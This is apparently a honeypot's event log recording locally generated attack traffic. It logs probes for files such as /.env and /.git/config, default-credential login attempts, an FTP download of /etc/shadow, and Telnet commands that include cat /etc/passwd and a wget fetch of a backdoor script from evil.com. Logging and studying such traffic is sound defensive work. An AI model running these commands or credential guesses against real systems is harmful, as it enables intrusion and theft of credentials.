[2026-08-06T10:33:34.315Z] INFO HTTP | http_request | 127.0.0.1:43914 | GET /admin
[2026-08-06T10:33:44.139Z] MEDIUM TELNET | command_execution | 127.0.0.1:33476 | cmd: ls -la
[2026-08-06T10:33:44.442Z] MEDIUM TELNET | command_execution | 127.0.0.1:33476 | cmd: netstat -tlnp
[2026-08-06T10:33:44.746Z] MEDIUM TELNET | command_execution | 127.0.0.1:33476 | cmd: exit
[2026-08-06T16:48:02.656Z] HIGH SSH | login_attempt | 127.0.0.1:57330 | user=root pass=password123

[2026-08-06T16:48:02.687Z] HIGH HTTP | http_request | 127.0.0.1:34530 | GET /.git/config
[2026-08-06T16:48:02.710Z] MEDIUM HTTP | scanner_probe | 127.0.0.1:34530 | scanner_probe in GET /.git/config
[2026-08-06T16:48:02.746Z] HIGH HTTP | sensitive_file_access | 127.0.0.1:34530 | Accessed /.git/config
[2026-08-06T16:48:02.762Z] HIGH HTTP | http_request | 127.0.0.1:34544 | GET /wp-config.php.bak
[2026-08-06T16:48:02.780Z] HIGH HTTP | sensitive_file_access | 127.0.0.1:34544 | Accessed /wp-config.php.bak
[2026-08-06T16:48:02.798Z] INFO HTTP | http_request | 127.0.0.1:34560 | POST /login
[2026-08-06T16:48:02.817Z] MEDIUM HTTP | scanner_probe | 127.0.0.1:34560 | scanner_probe in POST /login
[2026-08-06T16:48:02.839Z] HIGH HTTP | credential_capture | 127.0.0.1:34560 | user=admin pass=test page=/login
[2026-08-06T16:48:02.859Z] HIGH HTTP | http_request | 127.0.0.1:34562 | GET /.env
[2026-08-06T16:48:02.878Z] HIGH HTTP | sensitive_file_access | 127.0.0.1:34562 | Accessed /.env
[2026-08-06T16:48:02.944Z] HIGH FTP | credential_capture | 127.0.0.1:37512 | user=admin pass=admin123
[2026-08-06T16:48:02.965Z] HIGH TELNET | credential_capture | 127.0.0.1:41138 | user=admin pass=admin
[2026-08-06T16:48:03.551Z] HIGH FTP | credential_capture | 127.0.0.1:37512 | user=root pass=toor
[2026-08-06T16:48:03.587Z] HIGH TELNET | credential_capture | 127.0.0.1:41138 | user=root pass=root
[2026-08-06T16:48:03.855Z] MEDIUM FTP | directory_traversal | 127.0.0.1:37512 | CWD /etc
[2026-08-06T16:48:04.158Z] HIGH TELNET | credential_capture | 127.0.0.1:41138 | user=test pass=test123
[2026-08-06T16:48:04.194Z] HIGH FTP | file_download | 127.0.0.1:37512 | RETR /etc/shadow
[2026-08-06T16:48:04.461Z] MEDIUM TELNET | command_execution | 127.0.0.1:41138 | cmd: whoami
[2026-08-06T16:48:04.765Z] MEDIUM TELNET | command_execution | 127.0.0.1:41138 | cmd: uname -a
[2026-08-06T16:48:05.069Z] MEDIUM TELNET | command_execution | 127.0.0.1:41138 | cmd: cat /etc/passwd
[2026-08-06T16:48:05.373Z] MEDIUM TELNET | command_execution | 127.0.0.1:41138 | cmd: wget http://evil.com/backdoor.sh
[2026-08-06T16:48:05.876Z] MEDIUM TELNET | command_execution | 127.0.0.1:41138 | cmd: exit
[2026-08-06T16:55:14.747Z] HIGH HTTP | http_request | 127.0.0.1:57940 | GET /.env
[2026-08-06T16:55:14.769Z] MEDIUM HTTP | scanner_probe | 127.0.0.1:57940 | scanner_probe in GET /.env
[2026-08-06T16:55:14.785Z] HIGH HTTP | sensitive_file_access | 127.0.0.1:57940 | Accessed /.env
[2026-08-06T16:55:14.804Z] INFO HTTP | http_request | 127.0.0.1:57942 | POST /login
[2026-08-06T16:55:14.827Z] MEDIUM HTTP | scanner_probe | 127.0.0.1:57942 | scanner_probe in POST /login
[2026-08-06T16:55:14.845Z] HIGH HTTP | credential_capture | 127.0.0.1:57942 | user=admin pass=test page=/login
[2026-08-06T16:55:14.942Z] HIGH FTP | credential_capture | 127.0.0.1:49074 | user=root pass=admin
[2026-08-06T16:55:14.962Z] HIGH TELNET | credential_capture | 127.0.0.1:50032 | user=admin pass=admin
[2026-08-06T16:55:15.349Z] HIGH TELNET | credential_capture | 127.0.0.1:50032 | user=root pass=root
[2026-08-06T16:55:15.757Z] HIGH TELNET | credential_capture | 127.0.0.1:50032 | user=test pass=test123
[2026-08-06T16:55:15.962Z] MEDIUM TELNET | command_execution | 127.0.0.1:50032 | cmd: whoami
[2026-08-06T16:55:16.166Z] MEDIUM TELNET | command_execution | 127.0.0.1:50032 | cmd: cat /etc/passwd
[2026-08-06T16:55:16.470Z] MEDIUM TELNET | command_execution | 127.0.0.1:50032 | cmd: exit
